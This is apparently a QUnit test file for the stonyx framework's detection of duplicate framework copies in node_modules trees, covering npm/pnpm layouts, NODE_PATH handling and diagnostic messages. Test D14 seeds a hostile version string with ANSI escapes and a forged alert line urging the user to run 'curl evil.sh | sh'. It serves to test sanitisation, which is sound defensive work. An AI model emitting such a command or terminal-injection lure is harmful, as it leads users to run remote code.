/**
 * Coverage for invariant I1 — "one core" — abofs/stonyx#108.
 *
 * The defect: five sibling repos pin `stonyx` EXACTLY in their own
 * `dependencies`, an exact pin cannot dedupe against a sibling's different
 * exact pin, and the consumer ends up with several framework singletons only
 * one of which is ever `start()`ed. Measured from the `stonyx new` scaffold at
 * `0.2.3-beta.96`: three copies on disk (`0.2.2`, `0.2.3-beta.6`,
 * `0.2.3-beta.11`).
 *
 * Every fixture here installs a REAL second `stonyx` package root under a
 * module's own `node_modules/`, which is the exact tree shape npm and pnpm
 * both produce for that manifest. Nothing is stubbed.
 *
 * Isolation constraint inherited from `modules-test.ts`: `modulePromises`
 * (modules.ts:19) is module-level state with no reset, so every test uses a
 * module name unique to that test.
 */
import QUnit from 'qunit';
import { execFile } from 'node:child_process';
import { accessSync, chmodSync, constants, existsSync, mkdirSync, realpathSync, symlinkSync, writeFileSync } from 'node:fs';
import { dirname, join, resolve } from 'node:path';
import { fileURLToPath } from 'node:url';
import { promisify } from 'node:util';
import loadModules from '../../src/modules.js';
import { assertDistIsFresh } from '../helpers/dist-freshness.js';
import {
  coreSeenBy,
  duplicateCoreMessage,
  findForeignCores,
  runningCore,
  type ForeignCore,
} from '../../src/util/duplicate-core.js';
import { captureConsole, createRoot, installModule, moduleSource, removeRoot, stubChronicle } from '../helpers/module-fixture.js';

const { module, test } = QUnit;

const repoRoot = resolve(dirname(fileURLToPath(import.meta.url)), '../..');
const execFileAsync = promisify(execFile);
const coreSeenByScript = resolve(dirname(fileURLToPath(import.meta.url)), '../helpers/core-seen-by-plain-node.mjs');

/**
 * Same hard bound as the other subprocess suites in this repo: `execFile` has
 * no default timeout and this repo sets no `QUnit.config.testTimeout`, so an
 * unbounded child hangs the run with no TAP.
 */
const SUBPROCESS_TIMEOUT_MS = 20_000;

/** Runs `coreSeenBy` in a process STARTED with the given NODE_PATH. */
async function coreSeenByWithNodePath(moduleDir: string, nodePath: string): Promise<{ version: string } | null> {
  assertDistIsFresh('coreSeenByWithNodePath');

  const { stdout, stderr } = await execFileAsync('node', [ coreSeenByScript, moduleDir ], {
    timeout: SUBPROCESS_TIMEOUT_MS,
    killSignal: 'SIGKILL',
    env: { ...process.env, NODE_PATH: nodePath },
  });
  const marker = stdout.split('__CORE_SEEN_BY__')[1];

  if (!marker) throw new Error(`probe produced no result. stdout: ${stdout}\nstderr: ${stderr}`);

  return JSON.parse(marker) as { version: string } | null;
}

const roots: string[] = [];

/**
 * REALPATH'D, and that is load-bearing for D8.
 *
 * `mkdtemp(tmpdir())` returns `/var/folders/.../T/...` on macOS while the
 * directory's real path is `/private/var/folders/.../T/...`. `coreSeenBy`
 * realpaths the module dir, so any assertion that compares a fixture path
 * against a resolved one is really comparing `/var` with `/private/var` and
 * passes or fails on the `/private` prefix rather than on the property under
 * test. That is exactly how D8 stayed green on macOS while reding on Linux CI,
 * against correct AND incorrect code. Realpath'ing here makes every fixture in
 * this file the same shape CI runs on.
 */
function root(pkg: Record<string, unknown>): string {
  const dir = createRoot(pkg, 'stonyx-dupcore-fixture-');
  roots.push(dir);
  return realpathSync(dir);
}

/**
 * An installed async module. `main.js` WRITES A SENTINEL when it evaluates —
 * that is how the pre-flight tests tell "threw before importing" from "threw
 * while importing", which is the whole point of the check being a pre-flight.
 */
function installFixtureModule(rootPath: string, name: string, className: string): string {
  const sentinel = join(rootPath, `${className}.evaluated`);

  installModule(rootPath, name, { main: 'main.js', keywords: [ 'stonyx-module', 'stonyx-async' ]}, {
    'main.js': `import { writeFileSync } from 'node:fs';\nwriteFileSync(${JSON.stringify(sentinel)}, 'yes');\n${moduleSource(className)}`,
    'config/environment.js': 'export default {};\n',
  });

  return sentinel;
}

/** Installs a SECOND physical `stonyx` package root inside `<module>/node_modules`. */
function installNestedCore(rootPath: string, moduleName: string, version: string): string {
  const dir = join(rootPath, 'node_modules', moduleName, 'node_modules', 'stonyx');

  mkdirSync(dir, { recursive: true });
  writeFileSync(join(dir, 'package.json'), JSON.stringify({ name: 'stonyx', version, type: 'module', main: 'dist/main.js' }));

  return dir;
}

module('[Unit] duplicate-core detector', function(hooks) {
  hooks.afterEach(function() {
    while (roots.length) removeRoot(roots.pop()!);
  });

  // D1 — the negative case, and the control for D2. Without it, D2 proves only
  // that the detector reports SOMETHING, not that it discriminates.
  test('D1: reports nothing when a module resolves the running core', function(assert) {
    const rootPath = root({ name: 'd1-app' });
    installModule(rootPath, '@stonyx/d1-mod', { main: 'main.js', keywords: [ 'stonyx-module' ]});
    // The app's own copy of the core IS this repo. A module with no nested copy
    // walks up to it, exactly as Node would.
    symlinkSync(repoRoot, join(rootPath, 'node_modules', 'stonyx'), 'dir');

    const core = runningCore();
    const seen = coreSeenBy(join(rootPath, 'node_modules', '@stonyx/d1-mod'));

    assert.ok(core, 'premise: the running core identifies itself');
    assert.strictEqual(seen?.root, core?.root, 'the module resolves the same physical package root');
    assert.deepEqual(
      findForeignCores([ { name: '@stonyx/d1-mod', dir: join(rootPath, 'node_modules', '@stonyx/d1-mod') } ]),
      [],
      'and is not reported'
    );
  });

  // D2 — the seeded known-bad. Same fixture as D1 plus one nested package root.
  test('D2: reports a module whose nested copy is a different physical package root', function(assert) {
    const rootPath = root({ name: 'd2-app' });
    installModule(rootPath, '@stonyx/d2-mod', { main: 'main.js', keywords: [ 'stonyx-module' ]});
    symlinkSync(repoRoot, join(rootPath, 'node_modules', 'stonyx'), 'dir');
    installNestedCore(rootPath, '@stonyx/d2-mod', '0.0.0-nested');

    const moduleDir = join(rootPath, 'node_modules', '@stonyx/d2-mod');
    const foreign = findForeignCores([ { name: '@stonyx/d2-mod', dir: moduleDir } ]);

    assert.strictEqual(foreign.length, 1, 'the module is reported');
    assert.strictEqual(foreign[0]?.moduleCore.version, '0.0.0-nested', 'with the version it actually sees');
    assert.strictEqual(
      foreign[0]?.moduleCore.root,
      join(realpathSync(rootPath), 'node_modules', '@stonyx/d2-mod', 'node_modules', 'stonyx'),
      'and the absolute path of the copy it would import (symlinks resolved, as node resolves them)'
    );
    assert.strictEqual(foreign[0]?.runningCore.root, runningCore()?.root, 'alongside the running core');
    assert.notStrictEqual(foreign[0]?.moduleCore.root, foreign[0]?.runningCore.root, 'which is a different path');
  });

  // D7 — the pnpm tree shape, and the control for the realpath narrowing in
  // `coreSeenBy`. `stonyx new` installs with pnpm (src/cli/new.ts:335), so this
  // IS the shape the documented procedure produces: every entry under
  // `node_modules/@stonyx/` is a symlink into the store, and Node resolves that
  // symlink BEFORE resolving the module's own imports.
  //
  // Without the realpath, the walk reads the app's flat `node_modules`, finds
  // the app's own core, and reports nothing — the check passes vacuously on
  // exactly the installer that produces the defect. Measured: with
  // `realPath(moduleDir)` replaced by `moduleDir`, D1-D6 all stay GREEN and
  // only this test reds.
  test('D7: resolves through a pnpm store symlink, not through the flat link path', function(assert) {
    const rootPath = root({ name: 'd7-app' });
    const store = join(rootPath, 'node_modules', '.pnpm', '@stonyx+d7-mod@1.0.0', 'node_modules');

    mkdirSync(join(store, '@stonyx', 'd7-mod'), { recursive: true });
    writeFileSync(
      join(store, '@stonyx', 'd7-mod', 'package.json'),
      JSON.stringify({ name: '@stonyx/d7-mod', version: '1.0.0', type: 'module', main: 'main.js', keywords: [ 'stonyx-module' ]})
    );
    mkdirSync(join(store, 'stonyx'), { recursive: true });
    writeFileSync(
      join(store, 'stonyx', 'package.json'),
      JSON.stringify({ name: 'stonyx', version: '0.0.0-pnpm-nested', type: 'module', main: 'dist/main.js' })
    );

    // The app's flat view: both entries are symlinks, exactly as pnpm writes them.
    mkdirSync(join(rootPath, 'node_modules', '@stonyx'), { recursive: true });
    symlinkSync(repoRoot, join(rootPath, 'node_modules', 'stonyx'), 'dir');
    symlinkSync(join(store, '@stonyx', 'd7-mod'), join(rootPath, 'node_modules', '@stonyx', 'd7-mod'), 'dir');

    const linkPath = join(rootPath, 'node_modules', '@stonyx', 'd7-mod');

    assert.notStrictEqual(realpathSync(linkPath), linkPath, 'premise: the module entry really is a symlink');
    assert.strictEqual(
      coreSeenBy(linkPath)?.version,
      '0.0.0-pnpm-nested',
      'the core is resolved from the store location, which is where node resolves it from'
    );
    assert.strictEqual(
      findForeignCores([ { name: '@stonyx/d7-mod', dir: linkPath } ]).length,
      1,
      'and the module is reported'
    );
  });

  // D3 — FAIL DIRECTION. The guard converts a silent wrong state into a loud
  // one; it must not invent a boot failure out of an inconclusive probe.
  test('D3: fails open — a module that cannot resolve stonyx at all is not reported', function(assert) {
    const rootPath = root({ name: 'd3-app' });
    installModule(rootPath, '@stonyx/d3-mod', { main: 'main.js', keywords: [ 'stonyx-module' ]});
    const moduleDir = join(rootPath, 'node_modules', '@stonyx/d3-mod');

    assert.strictEqual(coreSeenBy(moduleDir), null, 'no core is reachable from the module');
    assert.deepEqual(findForeignCores([ { name: '@stonyx/d3-mod', dir: moduleDir } ]), [], 'and nothing is reported');
    assert.deepEqual(
      findForeignCores([ { name: '@stonyx/d3-mod', dir: moduleDir } ], null),
      [],
      'nor when the running core cannot identify itself either'
    );
  });

  // D8 — CONTROL for the walk filter in `coreSeenBy` (`isWalkEntry`).
  // `require.resolve.paths` appends the CJS global folders (NODE_PATH,
  // ~/.node_modules, the node prefix) after the node_modules walk. ESM ignores
  // all of them, so honouring them would invent a "duplicate core" out of an
  // environment variable that the real import never consults — turning a boot
  // that works into a refusal.
  //
  // Must run in a subprocess: NODE_PATH is read once at bootstrap into
  // `Module.globalPaths`, so setting `process.env.NODE_PATH` from a test is a
  // check that cannot fail.
  //
  // WHAT THIS ASSERTS, AND WHY IT CHANGED. The previous version handed the
  // child a `/var/folders/...` NODE_PATH while the module dir realpath'd to
  // `/private/var/folders/...`, so the old prefix test missed on `/private`
  // rather than on non-ancestry: it was green on macOS against BOTH the correct
  // and the broken filter, and red on Linux against both. It measured the host,
  // not the invariant. Every path here is realpath-clean (see `root`), and the
  // two contaminated cases are the two shapes that matter:
  //
  //   SHALLOW — the store sits beside the app under a shared parent. This is
  //     the ordinary temp-dir and sibling-checkout shape, and the one CI hit.
  //   DEEP    — the store sits INSIDE the app (`<app>/tools`), so its parent is
  //     a genuine ancestor of the module dir. A filter that only rejected
  //     shallow entries would still admit this one.
  //
  // Neither directory is named `node_modules`, so neither is anything node's
  // walk would ever emit, and both must be ignored.
  test('D8: a stonyx reachable only via NODE_PATH is ignored, shallow or deep', async function(assert) {
    const rootPath = root({ name: 'd8-app' });
    installModule(rootPath, '@stonyx/d8-mod', { main: 'main.js', keywords: [ 'stonyx-module' ]});
    symlinkSync(repoRoot, join(rootPath, 'node_modules', 'stonyx'), 'dir');

    // The ambient store. `<contaminated>/stonyx` is what NODE_PATH points at;
    // `<contaminated>/node_modules/stonyx` is the SAME manifest reachable by a
    // genuine walk, and exists only so this fixture's liveness is provable.
    const contaminated = root({ name: 'd8-nodepath-store' });
    const ambientManifest = JSON.stringify({ name: 'stonyx', version: '0.0.0-ambient', type: 'module', main: 'dist/main.js' });

    for (const dir of [ join(contaminated, 'stonyx'), join(contaminated, 'node_modules', 'stonyx') ]) {
      mkdirSync(dir, { recursive: true });
      writeFileSync(join(dir, 'package.json'), ambientManifest);
    }

    installModule(contaminated, '@stonyx/d8-liveness', { main: 'main.js', keywords: [ 'stonyx-module' ]});

    // A module with NO reachable core is where a global folder would win, and
    // it is the only place the filter is observable at all.
    const isolated = root({ name: 'd8-isolated-app' });
    installModule(isolated, '@stonyx/d8-isolated', { main: 'main.js', keywords: [ 'stonyx-module' ]});

    const isolatedModuleDir = join(isolated, 'node_modules', '@stonyx/d8-isolated');
    const deepStore = join(isolated, 'tools');

    mkdirSync(join(deepStore, 'stonyx'), { recursive: true });
    writeFileSync(join(deepStore, 'stonyx', 'package.json'), ambientManifest);

    assert.strictEqual(realpathSync(isolated), isolated, 'premise: the fixture root is realpath-clean, so nothing here can pass on a /private prefix');

    // LIVENESS of the ambient fixture itself: reached by a real walk it IS
    // reported. So a null below is the filter rejecting the candidate, not an
    // unreadable or absent manifest.
    assert.strictEqual(
      (await coreSeenByWithNodePath(join(contaminated, 'node_modules', '@stonyx/d8-liveness'), contaminated))?.version,
      '0.0.0-ambient',
      'liveness: the ambient core IS resolvable when it sits on the module\'s own walk'
    );
    assert.strictEqual(
      (await coreSeenByWithNodePath(join(rootPath, 'node_modules', '@stonyx/d8-mod'), contaminated))?.version,
      runningCore()?.version,
      'premise: with a real core in the tree, that is what is reported'
    );
    assert.strictEqual(
      await coreSeenByWithNodePath(isolatedModuleDir, contaminated),
      null,
      'SHALLOW: a NODE_PATH store beside the app, under a shared parent, is not reported'
    );
    assert.strictEqual(
      await coreSeenByWithNodePath(isolatedModuleDir, deepStore),
      null,
      'DEEP: a NODE_PATH store INSIDE the app, whose parent is a genuine ancestor, is not reported either'
    );
  });

  // D10 — the fail-opens are SILENT, which is the half of the disclosure that
  // was never pinned. The fail DIRECTION is deliberate and stays: this guard
  // converts a silent wrong state into a loud one and must not invent a boot
  // failure out of an inconclusive probe. But all three sites were measured
  // reachable, and each let a tree carrying a genuine second core boot clean
  // and quiet while the control threw in the same run — so "we could not check"
  // was indistinguishable from "we checked and it is fine".
  //
  // D3 pins the direction for two arms. This pins the SIGNAL, and covers the
  // arm nothing covered: a nested manifest that exists and will not read.
  test('D10: a nested manifest that exists but will not read fails open AND says so', function(assert) {
    const rootPath = root({ name: 'd10-app' });
    installModule(rootPath, '@stonyx/d10-mod', { main: 'main.js', keywords: [ 'stonyx-module' ]});
    symlinkSync(repoRoot, join(rootPath, 'node_modules', 'stonyx'), 'dir');

    const moduleDir = join(rootPath, 'node_modules', '@stonyx/d10-mod');
    const nested = installNestedCore(rootPath, '@stonyx/d10-mod', '0.0.0-nested');
    const nestedManifest = join(nested, 'package.json');
    const probe = (): { foreign: ForeignCore[]; reports: string[] } => {
      const reports: string[] = [];
      const foreign = findForeignCores([ { name: '@stonyx/d10-mod', dir: moduleDir } ], undefined, message => reports.push(message));

      return { foreign, reports };
    };

    // CONTROL, same fixture, readable manifest: the second core IS reported and
    // nothing is written. So a silent [] below is the fail-open, not an inert
    // harness.
    const control = probe();

    assert.strictEqual(control.foreign.length, 1, 'control: with a readable manifest the second core is reported');
    assert.deepEqual(control.reports, [], 'control: and nothing is reported as inconclusive');

    writeFileSync(nestedManifest, '{ this is not json');

    const corrupt = probe();

    assert.deepEqual(corrupt.foreign, [], 'an unparseable nested manifest fails OPEN — no invented boot failure');
    assert.strictEqual(corrupt.reports.length, 1, 'and is reported exactly once');
    assert.ok(corrupt.reports[0]?.includes(nestedManifest), `naming the file it could not read, got: ${corrupt.reports[0]}`);
    assert.ok(corrupt.reports[0]?.includes('SyntaxError'), 'and why');

    writeFileSync(nestedManifest, JSON.stringify({ name: 'stonyx', version: '0.0.0-nested' }));
    chmodSync(nestedManifest, 0o000);

    let unreadable = true;

    // Running as root defeats the mode bits entirely; assert the premise rather
    // than assert nothing.
    try {
      accessSync(nestedManifest, constants.R_OK);
      unreadable = false;
    } catch { /* expected */ }

    if (unreadable) {
      const denied = probe();

      assert.deepEqual(denied.foreign, [], 'a chmod 000 nested manifest also fails OPEN');
      assert.strictEqual(denied.reports.length, 1, 'and is reported');
      assert.ok(denied.reports[0]?.includes('EACCES'), `naming the reason, got: ${denied.reports[0]}`);
    } else {
      assert.ok(true, 'premise absent: this process can read a chmod 000 file, so the EACCES arm is not observable here');
      assert.ok(true, '');
      assert.ok(true, '');
    }

    chmodSync(nestedManifest, 0o644);
  });

  // D11 — the second fail-open site, and the widest: no running core means no
  // comparison and nothing checked at all. `owningCore` returning null is
  // reachable in production by interposing a `package.json` above `dist/`,
  // measured to boot a two-core tree clean and silent.
  test('D11: an unidentifiable running core fails open AND says so', function(assert) {
    const rootPath = root({ name: 'd11-app' });
    installModule(rootPath, '@stonyx/d11-mod', { main: 'main.js', keywords: [ 'stonyx-module' ]});
    symlinkSync(repoRoot, join(rootPath, 'node_modules', 'stonyx'), 'dir');
    installNestedCore(rootPath, '@stonyx/d11-mod', '0.0.0-nested');

    const modules = [ { name: '@stonyx/d11-mod', dir: join(rootPath, 'node_modules', '@stonyx/d11-mod') } ];
    const reports: string[] = [];

    // CONTROL first: with a running core this exact tree IS reported.
    assert.strictEqual(findForeignCores(modules, undefined, message => reports.push(message)).length, 1, 'control: the second core is reported when the running core is known');
    assert.deepEqual(reports, [], 'control: and nothing is inconclusive');

    const blind: string[] = [];

    assert.deepEqual(findForeignCores(modules, null, message => blind.push(message)), [], 'with no running core nothing is reported as foreign');
    assert.strictEqual(blind.length, 1, 'but the skipped pre-flight is announced');
    assert.ok(blind[0]?.includes('could not identify itself'), `naming what went wrong, got: ${blind[0]}`);
  });

  // D4 — the message. #108 was filed because the OLD message named a file that
  // was present and a module that had not failed; asserting on the presence of
  // the two resolved paths is the part that cannot be produced by accident.
  test('D4: the diagnostic names the module, both absolute paths, both versions and the remedy', function(assert) {
    const foreign: ForeignCore[] = [ {
      moduleName: '@stonyx/cron',
      moduleCore: { root: '/app/node_modules/@stonyx/cron/node_modules/stonyx', version: '0.2.3-beta.94' },
      runningCore: { root: '/app/node_modules/stonyx', version: '0.2.3-beta.96' },
    } ];
    const message = duplicateCoreMessage(foreign);

    assert.ok(message.includes('@stonyx/cron'), 'names the module');
    assert.ok(message.includes('/app/node_modules/stonyx'), 'names the running core path');
    assert.ok(message.includes('/app/node_modules/@stonyx/cron/node_modules/stonyx'), 'names the module\'s core path');
    assert.ok(message.includes('0.2.3-beta.96'), 'names the running core version');
    assert.ok(message.includes('0.2.3-beta.94'), 'names the module\'s core version');
    assert.ok(message.includes('peerDependencies'), 'gives the module author\'s remedy');
    assert.ok(message.includes('pin stonyx@0.2.3-beta.94'), 'and the consumer\'s interim remedy');
    assert.ok(message.includes('Scope of this check'), 'and states what it does NOT cover');
    assert.notOk(message.includes('config/environment'), 'and never mentions config/environment — that was the false claim');
  });

  // D9 — the copy COUNT and the pin advice, both found wrong by running the
  // check against a real `stonyx new` tree rather than a fixture.
  //
  // `foreign.length + 1` was right on that tree by coincidence (three modules,
  // three different copies) and is wrong whenever two modules share one nested
  // copy — which is the commonest npm shape, since siblings on the same exact
  // pin dedupe with each other. And "pin stonyx@<first foreign version>" is
  // advice that cannot work when the modules disagree among themselves; the
  // message this one replaces was wrong for exactly that reason, so it must
  // not assert more than it knows.
  test('D9: counts DISTINCT roots, and offers a pin only when the foreign versions agree AND differ from the running core', function(assert) {
    const runningCore = { root: '/app/node_modules/stonyx', version: '0.2.3-beta.96' };
    const shared = { root: '/app/node_modules/.pnpm/stonyx@0.2.3-beta.94/node_modules/stonyx', version: '0.2.3-beta.94' };

    const agreeing = duplicateCoreMessage([
      { moduleName: '@stonyx/cron', moduleCore: shared, runningCore },
      { moduleName: '@stonyx/orm', moduleCore: shared, runningCore },
    ]);

    assert.ok(agreeing.startsWith('Stonyx: 2 copies'), `two modules on one copy is TWO copies, got: ${agreeing.split('\n')[0]}`);
    assert.ok(agreeing.includes('pin stonyx@0.2.3-beta.94'), 'and one pin does reconcile them');

    const disagreeing = duplicateCoreMessage([
      { moduleName: '@stonyx/cron', moduleCore: shared, runningCore },
      { moduleName: '@stonyx/sockets', moduleCore: { root: '/app/node_modules/.pnpm/stonyx@0.2.3-beta.62/node_modules/stonyx', version: '0.2.3-beta.62' }, runningCore },
    ]);

    assert.ok(disagreeing.startsWith('Stonyx: 3 copies'), `three distinct roots is THREE copies, got: ${disagreeing.split('\n')[0]}`);
    assert.notOk(disagreeing.includes('pin stonyx@'), 'and no pin is offered, because none would work');
    assert.ok(disagreeing.includes('must be republished'), 'the remedy names what would actually fix it');

    // The third case, and the one the `versions.length === 1` guard got wrong:
    // the versions agree with EACH OTHER and with the running core. That is the
    // shape `npm install -g stonyx` plus `stonyx new` produces — global CLI,
    // local core, same version, two roots. The old guard told that consumer to
    // pin the version their running core already is, a pin already in effect
    // and demonstrably not deduping. The trigger is distinct ROOTS; the advice
    // was keyed on versions.
    const sameVersion = duplicateCoreMessage([
      { moduleName: '@stonyx/cron', moduleCore: { root: '/app/node_modules/@stonyx/cron/node_modules/stonyx', version: '0.2.3-beta.96' }, runningCore },
    ]);

    assert.ok(sameVersion.startsWith('Stonyx: 2 copies'), `got: ${sameVersion.split('\n')[0]}`);
    assert.notOk(sameVersion.includes('pin stonyx@'), 'no pin is offered when every copy is already that version');
    assert.ok(sameVersion.includes('duplicate INSTALL'), 'it is named as a duplicate install instead');
    assert.ok(sameVersion.includes('node_modules/.bin/stonyx'), 'and the remedy is the one that actually applies');
  });

  // D14 — the diagnostic renders THIRD-PARTY manifest data. `version` is read
  // from a package this app did not write, echoed verbatim into a terminal, and
  // rendered BEFORE any module entry point is imported — so it is reachable
  // under `npm install --ignore-scripts`, the one mode in which no attacker
  // code has otherwise run. Seeded with ANSI escapes and newlines it forged its
  // own lines inside the message and destroyed the column alignment.
  test('D14: a hostile version string cannot forge lines or escapes in the diagnostic', function(assert) {
    const runningCore = { root: '/app/node_modules/stonyx', version: '0.2.3-beta.96' };
    const hostile = '1.0.0\u001b[31m\n\n  ===> ALERT: run `curl evil.sh | sh` to repair your install <===\n' + 'x'.repeat(200);
    const message = duplicateCoreMessage([
      { moduleName: '@stonyx/mod', moduleCore: { root: '/app/node_modules/@stonyx/mod/node_modules/stonyx', version: hostile }, runningCore },
    ]);

    // CONTROL, same shape, benign version: the value IS rendered, so a failure
    // to find the hostile text below is sanitisation and not a missing row.
    const control = duplicateCoreMessage([
      { moduleName: '@stonyx/mod', moduleCore: { root: '/app/node_modules/@stonyx/mod/node_modules/stonyx', version: '9.9.9-benign' }, runningCore },
    ]);

    assert.ok(control.includes('9.9.9-benign'), 'control: a benign version is rendered verbatim');
    assert.notOk(message.includes('\u001b'), 'no ESC survives into the message');
    assert.deepEqual(
      message.split('\n').filter(line => line.trimStart().startsWith('===>')),
      [],
      'the text the manifest tried to inject never gets a line of its own — the forgery was the newline, not the words'
    );
    assert.strictEqual(
      message.split('\n').length,
      control.split('\n').length,
      'the hostile value adds no lines: the message has exactly the same shape as the benign one'
    );
    assert.ok(message.includes('1.0.0?'), 'the value is still shown, with the non-printable bytes replaced');
    assert.ok(message.includes('...'), 'and clamped, so it cannot push the rest of the message off screen');
  });
});

module('[Unit] loadModules pre-flight', function(hooks) {
  hooks.afterEach(function() {
    while (roots.length) removeRoot(roots.pop()!);
  });

  // D5 — the reason this is a PRE-FLIGHT and not a better catch. A module that
  // does not touch `Stonyx.config` at load time never throws; it initialises
  // against a second singleton and reports success. So the assertion is that
  // the entry point was never EVALUATED, with the sentinel's own liveness
  // proven in the same test.
  test('D5: throws before any module entry point is imported', async function(assert) {
    const clean = root({ name: 'd5-clean-app', devDependencies: { '@stonyx/d5-clean': '1.0.0' }});
    const cleanSentinel = installFixtureModule(clean, '@stonyx/d5-clean', 'D5Clean');
    symlinkSync(repoRoot, join(clean, 'node_modules', 'stonyx'), 'dir');

    await loadModules({}, clean, stubChronicle().asChronicle());

    assert.ok(existsSync(cleanSentinel), 'premise: with one core the entry point IS evaluated (sentinel is live)');

    const dup = root({ name: 'd5-dup-app', devDependencies: { '@stonyx/d5-dup': '1.0.0' }});
    const dupSentinel = installFixtureModule(dup, '@stonyx/d5-dup', 'D5Dup');
    symlinkSync(repoRoot, join(dup, 'node_modules', 'stonyx'), 'dir');
    installNestedCore(dup, '@stonyx/d5-dup', '0.0.0-nested');

    let error: Error | undefined;

    try {
      await loadModules({}, dup, stubChronicle().asChronicle());
    } catch (err) {
      error = err as Error;
    }

    assert.ok(error, 'the duplicated tree refuses to boot');
    assert.ok(error?.message.startsWith('Stonyx: 2 copies of the framework are installed'), `got: ${error?.message}`);
    assert.ok(error?.message.includes('0.0.0-nested'), 'and names the version the module would have imported');
    assert.notOk(existsSync(dupSentinel), 'and the module entry point was never evaluated');
  });

  /** Drives `loadModules` and reports what happened, warnings included. */
  async function boot(rootPath: string): Promise<{ error?: Error; warnings: string[] }> {
    const capture = captureConsole();

    try {
      await loadModules({}, rootPath, stubChronicle().asChronicle());

      return { warnings: capture.warnings };
    } catch (error) {
      return { error: error as Error, warnings: capture.warnings };
    } finally {
      capture.restore();
    }
  }

  // D12 — SCOPE. The pre-flight must check what the loader LOADS, not what
  // matches `@stonyx/*`. A scoped devDependency with no `stonyx-module` keyword
  // is warned about and skipped by the loader — never imported, never given a
  // config, incapable of registering anything on any singleton — and refusing
  // over its nested copy prescribed the module-author remedy ("declare stonyx
  // in devDependencies plus a non-optional peerDependencies range") to a
  // package that is not a module.
  //
  // Two controls, so a green here cannot come from an inert harness: the SAME
  // fixture with the keyword added does refuse, and the same non-module WITHOUT
  // a nested core also boots (so this is not reporting on absence).
  test('D12: a scoped dependency the loader skips does not refuse the boot', async function(assert) {
    const rootPath = root({ name: 'd12-app', devDependencies: { '@stonyx/d12-not-a-module': '1.0.0' }});
    installModule(rootPath, '@stonyx/d12-not-a-module', { main: 'main.js', keywords: [ 'some-other-thing' ]});
    symlinkSync(repoRoot, join(rootPath, 'node_modules', 'stonyx'), 'dir');
    installNestedCore(rootPath, '@stonyx/d12-not-a-module', '0.0.0-d12');

    const skipped = await boot(rootPath);

    assert.notOk(skipped.error, `a package the loader skips does not brick the boot, got: ${skipped.error?.message}`);
    assert.ok(
      skipped.warnings.some(warning => warning.includes('must contain the "stonyx-module" keyword')),
      'and the loader still says why it skipped it'
    );

    const control = root({ name: 'd12-control-app', devDependencies: { '@stonyx/d12-is-a-module': '1.0.0' }});
    // ASYNC control on purpose: D13 owns the sync arm, and a mutation that
    // exempts sync modules must red D13 alone rather than both.
    installFixtureModule(control, '@stonyx/d12-is-a-module', 'D12IsAModule');
    symlinkSync(repoRoot, join(control, 'node_modules', 'stonyx'), 'dir');
    installNestedCore(control, '@stonyx/d12-is-a-module', '0.0.0-d12');

    const withKeyword = await boot(control);

    assert.ok(
      withKeyword.error?.message.startsWith('Stonyx: 2 copies'),
      `control: the identical tree WITH the keyword is refused, got: ${withKeyword.error?.message}`
    );

    const noCore = root({ name: 'd12-nocore-app', devDependencies: { '@stonyx/d12-plain': '1.0.0' }});
    installModule(noCore, '@stonyx/d12-plain', { main: 'main.js', keywords: [ 'some-other-thing' ]});
    symlinkSync(repoRoot, join(noCore, 'node_modules', 'stonyx'), 'dir');

    assert.notOk((await boot(noCore)).error, 'control: and a non-module with no nested core boots too');
  });

  // D13 — the SYNC arm, which is the most consumer-visible change in #108 and
  // was measured only against `stonyx-async` fixtures before this round. Every
  // D1-D9 and acceptance fixture carries `stonyx-async`; a `stonyx-module`-only
  // module with a skewed pin is the case that flips from BOOTING to a hard
  // refusal, and docs/modules.md documented it as "booted, exit 0, no warning".
  //
  // It is refused deliberately: the loader never imports a sync module, so its
  // second singleton never announces itself, and that invisibility is the whole
  // reason I1 is a pre-flight. The keyword is no longer the variable.
  test('D13: a SYNC-only module with a second core is refused, and the same module with one core boots', async function(assert) {
    const dup = root({ name: 'd13-dup-app', devDependencies: { '@stonyx/d13-sync': '1.0.0' }});
    installModule(dup, '@stonyx/d13-sync', { main: 'main.js', keywords: [ 'stonyx-module' ]});
    symlinkSync(repoRoot, join(dup, 'node_modules', 'stonyx'), 'dir');
    installNestedCore(dup, '@stonyx/d13-sync', '0.0.0-d13-nested');

    const refused = await boot(dup);

    assert.ok(refused.error?.message.startsWith('Stonyx: 2 copies'), `got: ${refused.error?.message}`);
    assert.ok(refused.error?.message.includes('0.0.0-d13-nested'), 'naming the copy the sync module would have imported');
    assert.ok(refused.error?.message.includes('@stonyx/d13-sync'), 'and the module, which carries no stonyx-async keyword');

    const clean = root({ name: 'd13-clean-app', devDependencies: { '@stonyx/d13-sync-clean': '1.0.0' }});
    installModule(clean, '@stonyx/d13-sync-clean', { main: 'main.js', keywords: [ 'stonyx-module' ]});
    symlinkSync(repoRoot, join(clean, 'node_modules', 'stonyx'), 'dir');

    const booted = await boot(clean);

    assert.notOk(booted.error, `control: the identical sync module with ONE core boots, got: ${booted.error?.message}`);
    assert.deepEqual(booted.warnings, [], 'control: silently — so the refusal above is the second core, not the keyword');
  });

  // D6 — the tree #108 measured has THREE copies, not two. Reporting only the
  // first offender makes the consumer fix one pin, re-run, and meet the same
  // failure — the "partial rollout produces no observable improvement" trap.
  test('D6: reports every offending module, not just the first', async function(assert) {
    const rootPath = root({
      name: 'd6-app',
      devDependencies: { '@stonyx/d6-a': '1.0.0', '@stonyx/d6-b': '1.0.0' },
    });
    installFixtureModule(rootPath, '@stonyx/d6-a', 'D6A');
    installFixtureModule(rootPath, '@stonyx/d6-b', 'D6B');
    symlinkSync(repoRoot, join(rootPath, 'node_modules', 'stonyx'), 'dir');
    installNestedCore(rootPath, '@stonyx/d6-a', '0.0.0-a');
    installNestedCore(rootPath, '@stonyx/d6-b', '0.0.0-b');

    let error: Error | undefined;

    try {
      await loadModules({}, rootPath, stubChronicle().asChronicle());
    } catch (err) {
      error = err as Error;
    }

    assert.ok(error?.message.includes('@stonyx/d6-a'), 'names the first offender');
    assert.ok(error?.message.includes('@stonyx/d6-b'), 'and the second');
    assert.ok(error?.message.includes('0.0.0-a') && error?.message.includes('0.0.0-b'), 'with both versions');
    assert.ok(error?.message.startsWith('Stonyx: 3 copies'), `and counts all three copies, got: ${error?.message.split('\n')[0]}`);
  });
});
